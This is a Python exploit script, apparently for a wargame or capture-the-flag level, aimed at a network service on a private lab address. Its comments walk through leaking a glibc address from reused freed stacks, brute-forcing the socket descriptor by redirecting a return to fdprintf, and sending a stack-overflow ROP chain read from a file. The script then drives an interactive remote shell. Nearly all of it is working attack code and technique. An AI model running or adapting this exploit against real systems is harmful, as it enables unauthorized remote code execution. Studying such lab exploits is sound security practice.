import socket
import string
import sys
import time
import struct
import select

ADDR = "192.168.56.103"
PORT = 20005

chars = [ x for x in string.printable if ord(x)>0x20 ]

def recvline(s):
    l = b""
    while not l.endswith(b"\n"):
        l = l+s.recv(1)

    return l



system_to_free = 0x35dc0
free_to_sh = 0xc5ffa
free_to_fdprintf = 0x138f50
free_offset = 0x0728e0

def main():

    # REALLY VERBOSE EXPLOIT PROCESS DESCRIPTION:

    # Analyzing the binary, it turns out each created "task" is performed through a context-switch ( swapcontext(...) function call )
    # and each context has its own stack allocated through malloc.
    # Once a task completed its own job, it is swapped out and removed, i.e., its stack is freed.
    # The stack size of each task is always fixed to a constant value, and, consequently, performing 2 consecutive tasks, one after the other,
    # makes the second task use, as stack, the chunk malloc()'ed for the first task's stack, which still contains previous data. We will use this fact in order to
    # leak some glibc addresses.
    
    # When childtask reads from the socket for the command to execute, it searches for either "\r" or "\n" and sets the corresponding entry to "\0". 
    # Consequently, if none of the previous are provided, the subsequent strdup will copy everything up to the first "\0", which may comprehend additional bytes.
    # This behavior is useful when matched with the "checkname" task since it prints back to the user the "strdup" of the user provided input, which,
    # if long enough and not containing "\r" or "\n", could include a leaked address.

    # More in detail, when the childtask re-uses a stack that was previously malloc()'ed by another task and then freed, the allocated stack memory
    # will contain bytes belonging to the previous task run and, among these, there are also glibc addresses.
    # In the subsequent code I purposely created a first connection to the target socket and call for "checkname asdf" in order to create a 
    # stack and populate it with data needed for the exploit.
    # Exactly after this call, a new socket connection is created, so to make sure that the "childtask" associated to this new socket would 
    # re-use the stack previously assigned to "checkname asdf".


    # Specifically, we can leak 2 different pointers through this mechanism:
    
    #   - the first one is the "free"+109 instruction inside the glib
    #   - the second one is the _int_free+19 instruction. 
    # In the below code, only the "free"+109 is leaked, since, after leaking both in previous runs, I already retrieved which is the used library.
    # The "free"+109 instruction address is stored 0xe2 bytes after the name to check inside "checkname", i.e., 76 bytes after the beginning of childtask's buffer.

    # Once the childtask uses the proper stack, it is time to perform the leakage.
    # The idea is the following: we ask the binary for "checkname" task with a name of exactly 0xe2 bytes and no trailing "\r" or "\n".
    # This will make sure that the buffer receiving the command will be filled until reaching the address of "free"+109 without any "\0" in between.

    # Consequently, the subsequent strdup function call will copy the entire string plus the "free"+109 address plus some other spurious bytes we don't care about.
    # This string, if anything goes as expected, will be printed back to the user together with the result of "get_and_hash", which we don't care about.

    # In order for the program not to crash however, the "get_and_hash" "name" buffer has to be filled up to 32 bytes and that is clearly NOT the case of the strdup()'ed
    # string. However, the "get_and_hash" function STOPS copying inside "name" as soon as an "@" character is found. Placing a "@" as the first name character
    # thus allows for everything to go as expected and successfully return without crashing the program.

    # In the subsequent program I performed a one shot operation, assuming that everything works as expected. 
    # On a real case scenario, there is a slight chance that, in between the "checkname" task and the new connection, there would be another client connecting, and 
    # this may fail. To make it more resilient it is suggested to perform a loop that tries to leak the address until the byte 0xe2 of the received response string
    # isn't equal to the last "free"+109 address byte.

    # Now we need to understand where to find the exploitable vulnerability.
    # There are 2 points where a stack overflow can occur:
    #   - the first one is inside the senddb function, but, after many attempts, it seems not exploitable;
    #   - the second one is the copying of the strdup()'ed string inside the name buffer of "get_and_hash".
    #       - I will rely on this vulnerability for the next exploit.
    
    # Once the leakage has been done, we only miss the file descriptor our socket is associated to. Although there are some solutions out there relying on the fact
    # that Linux assign sockets starting from the lowest free index, i.e., 3 in a program with only our user, I wanted something more reliable.

    # Because of this, the idea is to exploit the "get_and_hash" function to make it misbehave. 
    # Specifically, if we take a look at gdb just before returning to the "checkname" function, we can see that the stack is composed as follows:

    # | Checkname + 57 (RET Address) |
    # | String size (0x20)           |
    # | Strdup()'ed string           |
    # | "@" character (0x40)         |

    # On the other hand, if we take a look at "Checkname+112" (i.e., call to fdprintf), we see that the stack needed is as follows:

    # | File descriptor |
    # | String buffer   |
    # | Other string    |

    # Since we can perform the stack overflow in "get_and_hash", we can overwrite exactly the stack presented above. 
    # Knowing the glibc address, and relying on the fact that the executable is a PIE, we can compute the "Checkname+112" address fairly easily.
    # Indeed, the mainline Linux ASLR with PIE places all the shared libraries at a known and fixed offset one from each other
    # ( for more refer to: http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html ).

    # With the knowledge of the "Checkname+112" address, we can overwrite the RET address of the "get_and_hash" stack frame with it and return directly
    # to fdprintf call. Additionally, we can overwrite part of the "String size" argument (see stack above) with our presumed fd index.

    # In synthesis, we now have the top of the stack that correctly mimics the one required by fdprintf, and we can directly jump to it.
    # The only missing variable is our fd, consequently, bruteforcing a sequence of calls to fdprintf with an incremental fd index will tell us the exact
    # file descriptor index.
    # Indeed, we will receive a string in output ONLY if the fd index is the right one, so, we can iterate through all the file descriptor indexes until
    # we get a response.
    # To make things more clear, at each "checkname" task call we will get the following "get_and_hash" stack frame:

    # Call "checkname [a]x44[fdprintf addr][file descriptor index]"<------
    #                |                                                   |
    #          get_and_hash                                              |
    #                |                                                   |
    #                v                                                   |
    # | Checkname + 112 (RET Address) |                                  |
    # | Presumed FD (bruteforce)      |                                  |
    # | Strdup()'ed string            |                              inc fd
    # | "@" character ( nevermind)    |                                  |
    #                |                                                   |
    #                |                                                   |
    #          response received? -------------------------N--------------
    #                |
    #                Y
    #                |
    #                |
    #                V
    #            GOT IT!


    # Once leaked the File descriptor everything is ready and what's left is just a pretty standard ROP chain creation.
    # I crafted one from the leaked glibc version and put it into the "ROP.txt" file in a format that allows me to dynamically
    # generate the instructions needed to place the file descriptor in place.

    # There is only one last thing to notice about the exploitation part. One may argue that, due to ASLR, the addresses of the
    # ROP gadgets could match the "@" character, however, taking a look at the ROPs I used, the lowest byte never is 0x40
    # and the same can be said for the second lowest one, since the low nibble is never 0 and that is not touched by ASLR.
    # The highest byte is always equal to 0xb7. It is only remained to determine which is the value of the third byte.
    # Although I couldn't find a reasonable explanation of ASLR randomness, by multiple runs of ldd on the same executable, it turns out
    # that the third byte of glibc never goes below 0x50, and this implies that 0x40 will never be assumed as a possible value.

    # Creating the populating socket.

    prep = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    prep.connect(( ADDR, PORT ))
    prep.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    # Populating a new stack to be reused.
    prep.send(b"checkname asdf\n")
    # Reuse the just used and freed stack to leak glib addresses.
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(( ADDR, PORT))
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    print(recvline(s))
    
    # Leaking the "free"+109 glibc address

    s.send(b"checkname @"+b"a"*0xe1)
    #print(recvline(s))
    free_addr = struct.unpack("<I",recvline(s)[0xe2:0xe6])[0]-109
    print("Free at:"+hex(free_addr))
    print("LEAKED LIBC libc6_2.13-20ubuntu5_i386 as for https://libc.blukat.me together with some other research about the offset 2d0, i.e. _int_free which has no symbol in libraries.")
    fdprintf_addr = free_addr + free_to_fdprintf
    s.setblocking(0)

    # Bruteforcing the file descriptor index. Starting from 3 since it is the lowest possible value for Linux as the executable doesn't close stdin, stdout, stderr.

    fd = 3
    while True:
        s.send(b"checkname "+b"a"*44+ struct.pack("<I", fdprintf_addr)+struct.pack("<I", fd)+b"\n")
        ready = select.select([s],[],[], 0.3)
        if ready[0]:
            s.recv(1024)
            print("Found socket fd: "+str(fd))
            break
        fd = fd+1
    
    base_libc = free_addr - free_offset
    s.setblocking(1)

    # NOTE: The file ROP.txt is structured to have '++++' line for padding values that are there just to match some POPs
    #       and a line containing '****' each time it is necessary to increment the current file descriptor value to get to the one of this program.
    #       Notice that it is ALWAYS Necessary to autonomously zero the register containing that file descriptor prior to the increment.
    #       The last line of the file, separated by a \n from the ROP payload, is the ROP gadget used to perform the file description increment 
    #       in place of '****'.
    #       The executable already takes care of repeating that instruction multiple times so to increment the file description for the needed amount of
    #       times.

    fi = open("ROP.txt", "r")
    lines = fi.readlines()
    tmp_rops = [ x.split(" : ")[0] for x in lines]
    fd_select = struct.pack("<I",int(tmp_rops.pop(), 16)+base_libc)
    rops = []
    # Removing separator new line.
    tmp_rops.pop()
    for rop in tmp_rops:
        if "+" in rop:
            rops.append(struct.pack("<I", 0x61616161))
        elif "*" in rop:
            for i in range(fd):
                rops.append(fd_select)
        else:
            rops.append(struct.pack("<I", int(rop, 16)+base_libc))
    #print([hex(struct.unpack("<I",rop)[0]) for rop in rops])
    payload = b"checkname "+b"a"*44+b"".join(rops)+b"\n"
    
    #DEBUG purposes only. Activate if you need time to attach to GDB and see the ROP in progress.
    #print(payload)
    #input("Press ENTER when ready")

    # Delivering the present :D

    s.send(payload)
    s.setblocking(0)
    while True:
        cmd = input("$ ")
        if cmd == "exit":
            break
        s.send(cmd.encode("ascii")+b"\n")
        while True:
            ready = select.select([s],[],[], 0.2)
            if ready[0]:
                print(s.recv(1024).decode("ascii"))
            else:
                break
    prep.close()

    


if __name__ == "__main__":
    main()
